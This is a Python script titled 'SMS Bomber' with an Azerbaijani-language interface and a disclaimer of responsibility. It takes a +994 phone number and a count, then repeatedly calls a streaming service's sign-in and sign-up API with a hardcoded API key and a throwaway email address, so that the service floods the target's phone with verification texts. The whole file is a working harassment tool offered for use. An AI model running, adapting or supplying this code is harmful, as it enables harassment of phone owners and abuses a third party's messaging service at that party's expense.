#!/usr/bin/env python3



import requests as rq

import colorama

from colorama import Fore, Back, Style

"""

SMS Bomber



with :) Deniz

"""



def send(target):

  header = {

    "x-api-key": "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"

  }



  data = {

    "requestType":"send",

    "phoneNumber":"+994"+target,

    "screenName":"signin"

  }



  url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-44067eab-5337-99d8-11eb-99ca1e4db186"

  res = rq.post(url, json=data, headers=header)

  if res.json().get("code"):

    data = {

      "requestType":"send",

      "phoneNumber":"+994"+target,

      "emailConsent":"true",

      "whatsappConsent":"true",

      "email":"cicas94417@iconmle.com"

    }

    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"



    res = rq.post(url, json=data, headers=header)

    if not res.json().get("sent"): return False

  return True

  

print(Fore.RED)

print("""

 .d8888b. 888b     d888 .d8888b. 888888b.   .d88888b. 888b     d888888888b.  88888888888888888b.        d88888888888888P8888888888 
d88P  Y88b8888b   d8888d88P  Y88b888  "88b d88P" "Y88b8888b   d8888888  "88b 888       888   Y88b      d88888      d88P 888        
Y88b.     88888b.d88888Y88b.     888  .88P 888     88888888b.d88888888  .88P 888       888    888     d88P888     d88P  888        
 "Y888b.  888Y88888P888 "Y888b.  8888888K. 888     888888Y88888P8888888888K. 8888888   888   d88P    d88P 888    d88P   8888888    
    "Y88b.888 Y888P 888    "Y88b.888  "Y88b888     888888 Y888P 888888  "Y88b888       8888888P"    d88P  888   d88P    888        
      "888888  Y8P  888      "888888    888888     888888  Y8P  888888    888888       888 T88b    d88P   888  d88P     888        
Y88b  d88P888   "   888Y88b  d88P888   d88PY88b. .d88P888   "   888888   d88P888       888  T88b  d8888888888 d88P      888        
 "Y8888P" 888       888 "Y8888P" 8888888P"  "Y88888P" 888       8888888888P" 8888888888888   T88bd88P     888d88888888888888888888 
                                                                                                                                               
  with :) Deniz                            

  https://t.me/skull_team_aze                                  

  Qeyd : Biz Heç bir şeydən məsuliyyət daşımırıq.

""")

print(Fore.MAGENTA + " <3 ")

print(Style.RESET_ALL)



def main():

  

  target = input("[*] Nömrəni (+994) Olmadan Yaz! (0 Yazmırıq) (Məs:551234567): ")

  amount = int(input("[*] Göndəriləcək SMS sayı: "))

  sent, nsent = 0, amount

  for i in range(1, amount + 1):

    try:

      if send(target):

        print(f"[ID: {i}] SMS Uğurla Göndərildi!")

        sent += 1

        nsent -= 1

      else:

        print(f"[ID: {i}] SMS göndərmək alınmadı...(Yəqin ki, blok etdi)")

    except KeyboardInterrupt: break

    except Exception as e: print(e); break

  print(f"\n[*] Ümumi Göndərilən: {amount}\n[+] Göndərilən: {sent}\n[-] Alınmayan: {nsent}")



if __name__ == "__main__":

  main()
